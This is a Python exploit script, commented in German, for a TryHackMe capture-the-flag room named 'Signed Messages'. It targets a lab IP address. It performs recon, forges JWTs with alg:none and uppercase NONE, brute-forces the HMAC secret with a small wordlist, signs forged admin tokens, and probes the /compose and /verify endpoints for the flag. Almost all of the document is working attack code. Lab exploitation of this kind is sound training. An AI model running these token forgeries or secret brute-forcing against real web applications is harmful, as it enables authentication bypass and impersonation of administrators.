#!/usr/bin/env python3
"""
TryHackMe — Signed Messages
============================
Target  : http://10.113.167.230:5000
Endpoints: /login  /compose  /verify

Angriffsvektoren (in Reihenfolge):
  1. Recon  — Antworten / Cookies / Token-Format verstehen
  2. alg:none — JWT ohne Signatur akzeptieren?
  3. Weak secret — HMAC-Secret brute-forcen
  4. Algorithm Confusion — HS256 mit Public-Key als Secret
  5. /verify-Endpoint — leakt er den Key oder die Flag direkt?
"""

import base64
import hashlib
import hmac
import json
import sys
import textwrap
import requests

TARGET = "http://10.113.167.230:5000"
SESSION = requests.Session()

# ── Hilfsfunktionen ───────────────────────────────────────────────────────────

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)

def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """Gibt (header, payload, signature_raw) zurück."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Kein gültiges JWT: {token[:80]}")
    header  = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts[2]

def forge_jwt_none(payload: dict) -> str:
    """Erstellt ein JWT mit alg:none (keine Signatur)."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."

def forge_jwt_hs256(payload: dict, secret: str) -> str:
    """Erstellt ein gültiges HS256-JWT mit gegebenem Secret."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

# ── Schritt 1: Recon ─────────────────────────────────────────────────────────

def recon() -> dict:
    """Erkundet alle Endpoints und gibt gesammelte Infos zurück."""
    info = {}
    print("\n" + "═"*60)
    print("  SCHRITT 1: RECON")
    print("═"*60)

    # GET /
    r = SESSION.get(TARGET, allow_redirects=True)
    print(f"\n[GET /]  HTTP {r.status_code}  URL: {r.url}")
    print(f"  Cookies: {dict(SESSION.cookies)}")

    # GET /login
    r = SESSION.get(f"{TARGET}/login")
    print(f"\n[GET /login]  HTTP {r.status_code}")
    print(f"  Body-Snippet: {r.text[:300]}")

    # POST /login als "admin"
    print("\n[POST /login]  username=admin …")
    r = SESSION.post(f"{TARGET}/login", data={"username": "admin"})
    print(f"  HTTP {r.status_code}  →  {r.url}")
    print(f"  Cookies nach Login: {dict(SESSION.cookies)}")
    print(f"  Body-Snippet: {r.text[:400]}")

    # Token aus Cookies/Body extrahieren
    token = None
    for name, val in SESSION.cookies.items():
        if any(x in name.lower() for x in ("token", "jwt", "session", "auth")):
            token = val
            info["cookie_name"] = name
            print(f"\n  [+] Token in Cookie '{name}': {val[:80]}…")
            break

    if not token:
        # Vielleicht im Body?
        import re
        m = re.search(r'eyJ[\w\-]+\.[\w\-]+\.[\w\-]*', r.text)
        if m:
            token = m.group(0)
            print(f"\n  [+] Token im Body gefunden: {token[:80]}…")

    if token:
        info["token"] = token
        try:
            h, p, s = decode_jwt(token)
            print(f"\n  JWT Header  : {json.dumps(h, indent=2)}")
            print(f"  JWT Payload : {json.dumps(p, indent=2)}")
            print(f"  JWT Sig (raw): {s[:40]}…")
            info["header"]  = h
            info["payload"] = p
        except Exception as e:
            print(f"  [!] JWT-Decode fehlgeschlagen: {e} — könnte anderes Format sein")
    else:
        print("  [!] Kein Token gefunden — prüfe /compose und /verify manuell")

    # GET /compose
    print("\n[GET /compose] …")
    r = SESSION.get(f"{TARGET}/compose")
    print(f"  HTTP {r.status_code}")
    print(f"  Body: {r.text[:400]}")

    # GET /verify
    print("\n[GET /verify] …")
    r = SESSION.get(f"{TARGET}/verify")
    print(f"  HTTP {r.status_code}")
    print(f"  Body: {r.text[:400]}")

    return info


# ── Schritt 2: alg:none Angriff ──────────────────────────────────────────────

def attack_alg_none(info: dict) -> bool:
    print("\n" + "═"*60)
    print("  SCHRITT 2: ALG:NONE ANGRIFF")
    print("═"*60)

    payload = info.get("payload", {"username": "admin", "role": "admin"})
    # Sicherstellen dass wir admin-Rechte claimen
    admin_payload = {**payload, "username": "admin", "role": "admin", "is_admin": True}

    for variant in [
        forge_jwt_none(admin_payload),
        # Variante: alg=NONE (Großschreibung)
        forge_jwt_none(admin_payload).replace('"alg":"none"', '"alg":"NONE"'),
    ]:
        label = variant[:60] + "…"
        print(f"\n  [*] Teste alg:none Token: {label}")

        # Mit Cookie
        cookies = {info.get("cookie_name", "token"): variant}
        r = SESSION.get(f"{TARGET}/compose", cookies=cookies)
        print(f"      GET /compose → HTTP {r.status_code}")
        if "flag" in r.text.lower() or "thm{" in r.text or "flag{" in r.text:
            print(f"  [!!!] FLAG GEFUNDEN via alg:none:\n{r.text}")
            return True
        print(f"      Body: {r.text[:200]}")

        # Auch /verify testen
        r = SESSION.get(f"{TARGET}/verify", cookies=cookies)
        print(f"      GET /verify → HTTP {r.status_code}  Body: {r.text[:200]}")
        if "flag" in r.text.lower() or "thm{" in r.text:
            print(f"  [!!!] FLAG:\n{r.text}")
            return True

    return False


# ── Schritt 3: Weak Secret Brute-Force ───────────────────────────────────────

WORDLIST = [
    # Generische Secrets
    "secret", "password", "123456", "admin", "key", "hmac",
    "supersecret", "mysecret", "verysecret", "jwt_secret",
    # LoveNote-spezifisch
    "lovenote", "love", "valentine", "lovenote_secret",
    "lovenote2025", "LoveNote", "LoveNoteSecret",
    "romance", "cupid", "heart", "xoxo",
    # CTF-typisch
    "tryhackme", "thm", "ctf", "hackme", "flag",
    "changeme", "default", "test", "dev",
    # Leer / trivial
    "", "0", "1",
]

def attack_weak_secret(info: dict) -> bool:
    print("\n" + "═"*60)
    print("  SCHRITT 3: WEAK SECRET BRUTE-FORCE")
    print("═"*60)

    token = info.get("token")
    if not token:
        print("  [!] Kein Token vorhanden – überspringe.")
        return False

    parts = token.split(".")
    if len(parts) != 3:
        print("  [!] Kein JWT-Format – überspringe.")
        return False

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    real_sig = b64url_decode(parts[2])

    print(f"  [*] Teste {len(WORDLIST)} Secrets gegen JWT-Signatur …")
    found_secret = None
    for secret in WORDLIST:
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(sig, real_sig):
            print(f"\n  [+] SECRET GEFUNDEN: '{secret}'")
            found_secret = secret
            break

    if not found_secret:
        print("  [-] Kein Secret in Wordlist gefunden.")
        return False

    # Jetzt Admin-Token fälschen
    payload = info.get("payload", {})
    admin_payload = {**payload, "username": "admin", "role": "admin", "is_admin": True}
    forged = forge_jwt_hs256(admin_payload, found_secret)
    print(f"  [*] Gefälschter Admin-Token: {forged[:80]}…")

    cookies = {info.get("cookie_name", "token"): forged}
    for endpoint in ("/compose", "/verify", "/admin", "/flag", "/"):
        r = SESSION.get(f"{TARGET}{endpoint}", cookies=cookies)
        print(f"  GET {endpoint} → HTTP {r.status_code}  Body: {r.text[:300]}")
        if "flag" in r.text.lower() or "thm{" in r.text or "flag{" in r.text:
            print(f"\n  [!!!] FLAG GEFUNDEN:\n{r.text}")
            return True

    return False


# ── Schritt 4: /compose + /verify Flow ──────────────────────────────────────

def attack_compose_verify(info: dict) -> bool:
    """
    Compose erzeugt eine signierte Nachricht, /verify prüft sie.
    Vielleicht gibt /verify den Key preis, oder wir können
    eine Nachricht mit admin-Inhalt einreichen.
    """
    print("\n" + "═"*60)
    print("  SCHRITT 4: /COMPOSE + /VERIFY FLOW")
    print("═"*60)

    cookies = {}
    if info.get("token"):
        cookies[info.get("cookie_name", "token")] = info["token"]

    # Nachricht composieren
    for msg_content in [
        "hello",
        "admin",
        "get_flag",
        '{"role":"admin"}',
        "flag",
    ]:
        print(f"\n  [*] POST /compose  message='{msg_content}' …")
        r = SESSION.post(
            f"{TARGET}/compose",
            data={"message": msg_content, "content": msg_content, "msg": msg_content},
            cookies=cookies
        )
        print(f"  HTTP {r.status_code}  Body: {r.text[:400]}")

        if "flag" in r.text.lower() or "thm{" in r.text:
            print(f"  [!!!] FLAG:\n{r.text}")
            return True

        # Signierte Nachricht extrahieren und an /verify senden
        import re
        # Suche nach Base64 / JWT / Signature im Response
        sigs = re.findall(r'[A-Za-z0-9+/=_\-]{20,}', r.text)
        for sig in sigs[:5]:
            print(f"  [*] Teste Signature bei /verify: {sig[:40]}…")
            rv = SESSION.post(
                f"{TARGET}/verify",
                data={"signature": sig, "message": msg_content,
                      "token": sig, "signed": sig},
                cookies=cookies
            )
            print(f"      /verify HTTP {rv.status_code}  Body: {rv.text[:200]}")
            if "flag" in rv.text.lower() or "thm{" in rv.text:
                print(f"  [!!!] FLAG:\n{rv.text}")
                return True

    return False


# ── Schritt 5: Compose als Admin mit gefälschtem Token ───────────────────────

def attack_admin_compose(info: dict) -> bool:
    """Compose-Endpoint mit gefälschtem Admin-Token aufrufen."""
    print("\n" + "═"*60)
    print("  SCHRITT 5: ADMIN COMPOSE MIT ALG:NONE")
    print("═"*60)

    payload = info.get("payload", {})
    admin_payload = {**payload, "username": "admin", "role": "admin", "is_admin": True}
    forged = forge_jwt_none(admin_payload)
    cookies = {info.get("cookie_name", "token"): forged}

    for msg in ["flag", "get_flag", "admin", "../flag", "secret"]:
        r = SESSION.post(
            f"{TARGET}/compose",
            data={"message": msg, "content": msg, "recipient": "admin"},
            cookies=cookies
        )
        print(f"  POST /compose message='{msg}' → HTTP {r.status_code}")
        print(f"  Body: {r.text[:300]}")
        if "flag" in r.text.lower() or "thm{" in r.text or "flag{" in r.text:
            print(f"\n  [!!!] FLAG GEFUNDEN:\n{r.text}")
            return True

    return False


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    print("═"*60)
    print("  TryHackMe — Signed Messages Exploit")
    print(f"  Target: {TARGET}")
    print("═"*60)

    info = recon()

    attacks = [
        ("alg:none",           lambda: attack_alg_none(info)),
        ("Weak Secret",        lambda: attack_weak_secret(info)),
        ("Compose+Verify",     lambda: attack_compose_verify(info)),
        ("Admin Compose",      lambda: attack_admin_compose(info)),
    ]

    for name, attack_fn in attacks:
        try:
            if attack_fn():
                print(f"\n[✓] Angriff '{name}' erfolgreich!")
                sys.exit(0)
        except Exception as exc:
            print(f"[!] Fehler bei '{name}': {exc}")

    print("\n[-] Alle automatischen Angriffe fehlgeschlagen.")
    print("    Hinweise:")
    print("    - Schau in die Recon-Ausgabe welches Token-Format genutzt wird")
    print("    - Prüfe ob /verify eine Signature annimmt und den Key zurückgibt")
    print("    - Eventuell ist der HMAC-Key im Quellcode der Seite?")


if __name__ == "__main__":
    main()
